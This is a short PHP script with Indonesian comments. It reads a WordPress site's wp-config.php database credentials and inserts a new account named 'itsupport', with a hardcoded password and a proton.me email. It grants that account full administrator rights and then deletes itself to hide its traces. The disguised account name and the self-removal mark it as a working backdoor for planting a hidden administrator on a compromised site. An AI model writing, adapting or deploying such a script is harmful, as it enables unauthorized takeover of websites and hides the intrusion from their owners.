<?php
// cari wp-config.php di folder yang sama dengan script ini
$wp_config_path = __DIR__ . '/wp-config.php';

$user = 'itsupport'; // username baru
$user_password = 'Bebek@1337!'; // password baru
$email = 'kriwulmbulet@proton.me'; // email baru

if (file_exists($wp_config_path)) {
    require_once($wp_config_path);

    $localhost = DB_HOST;
    $database  = DB_NAME;
    $username  = DB_USER;
    $password  = DB_PASSWORD;
    $prefix    = $table_prefix;

    $conn = @mysqli_connect($localhost, $username, $password, $database) or die(mysqli_error($conn));

    $sqlInsertUser = "INSERT INTO {$prefix}users 
        (user_login, user_pass, user_email, user_status, user_registered, user_nicename) 
        VALUES ('$user', MD5('$user_password'), '$email', '0', NOW(), '$user')";

    $insertUserResult = @mysqli_query($conn, $sqlInsertUser) or die(mysqli_error($conn));

    if ($insertUserResult) {
        echo "<p style='color:green;font-weight:bold;'>✅ User <b>$user</b> berhasil dibuat dengan password <b>$user_password</b></p>";

        $userId = mysqli_insert_id($conn);

        $sqlInsertUsermeta1 = "INSERT INTO {$prefix}usermeta 
            (user_id, meta_key, meta_value) 
            VALUES ($userId, '{$prefix}capabilities', 'a:1:{s:13:\"administrator\";b:1;}')";
        $sqlInsertUsermeta2 = "INSERT INTO {$prefix}usermeta 
            (user_id, meta_key, meta_value) 
            VALUES ($userId, '{$prefix}user_level', '10')";

        @mysqli_query($conn, $sqlInsertUsermeta1) or die(mysqli_error($conn));
        @mysqli_query($conn, $sqlInsertUsermeta2) or die(mysqli_error($conn));

        echo "<p style='color:blue;'>🔑 User berhasil diberi role Administrator.</p>";
    } else {
        echo "<p style='color:red;'>❌ Gagal membuat user.</p>";
    }

    mysqli_close($conn);

    // hapus diri sendiri setelah selesai
    $self = __FILE__;
    if (file_exists($self)) {
        unlink($self);
        echo "<p style='color:orange;'>🗑️ Script ini telah otomatis dihapus untuk keamanan.</p>";
    }
} else {
    echo "<p style='color:red;'>⚠️ wp-config.php tidak ditemukan di folder ini.</p>";
}
?>
